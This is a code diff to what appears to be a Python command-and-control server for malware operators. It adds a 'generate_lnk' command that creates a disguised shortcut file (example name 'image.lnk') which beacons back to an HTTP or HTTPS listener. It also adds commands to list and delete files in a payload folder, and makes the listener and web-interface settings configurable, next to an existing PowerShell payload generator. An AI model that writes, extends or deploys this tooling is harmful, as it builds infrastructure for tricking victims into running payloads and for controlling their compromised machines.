@@ -23,7 +23,7 @@ import std_out_capture
 
 
 
-@app.route("/webinterface", methods=["POST","GET"])
+@app.route(webinterface_url, methods=["POST","GET"])
 @login_required
 def webinterface():
     if request.method == "POST":
@@ -45,7 +45,7 @@ if python_version != 3:
     sys.exit()
 
 
-listener = NewListener("startup","0.0.0.0",conf__port, "0.0.0.0","1","r");
+listener = NewListener(startup_listener_name,"0.0.0.0",conf__port, "0.0.0.0",startup_listener_interval,startup_listener_url);
 listener.start_listener();
 listener.create_path();
 listeners=listener
@@ -135,6 +135,44 @@ def basic_command_handler(command):
 
         if command == "exit":
             exit()
+        
+        if command == "ls":
+            list_payload_folder()
+        
+        if command.split(" ")[0] == "rm":
+            try:
+                remove_file_from_payload_folder(command.split(" ")[1])
+            except IndexError:
+                print(colored("[-] Please select a filename !", "red"))
+                print(colored("Syntax :  rm filename", "green"))
+                return
+
+
+        if command.split(" ")[0] == "generate_lnk":
+            try:
+                listener = command.split(" ")[1]
+                filename = command.split(" ")[2]
+            except IndexError:
+                print(colored("[-] Please select a listener !", "red"))
+                print(colored("Syntax :  generate_lnk listener_name filename", "green"))
+                print(colored("Example : generate_lnk listener1 image.lnk", "yellow"))
+                return
+
+            try:
+                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
+                interval = listeners_information[listener][4]
+                path = listeners_information[listener][5]
+                proto = listeners_information[listener][6]
+
+                # check if protocol is True then https is used
+                if proto:
+                    proto_to_use = "https"
+                else:
+                    proto_to_use = "http"
+                generate_lnk(filename,hostname, path, proto_to_use, interval)
+            except KeyError:
+                print(colored("[-] Wrong listener selected !", "red"))
+                return
 
         if command.split(" ")[0] == "generate_powershell":
             try:
@@ -156,7 +194,6 @@ def basic_command_handler(command):
                     proto_to_use = "https"
                 else:
                     proto_to_use = "http"
-
                 generate(hostname, path, proto_to_use, interval)
             except KeyError:
                 print(colored("[-] Wrong listener selected !", "red"))
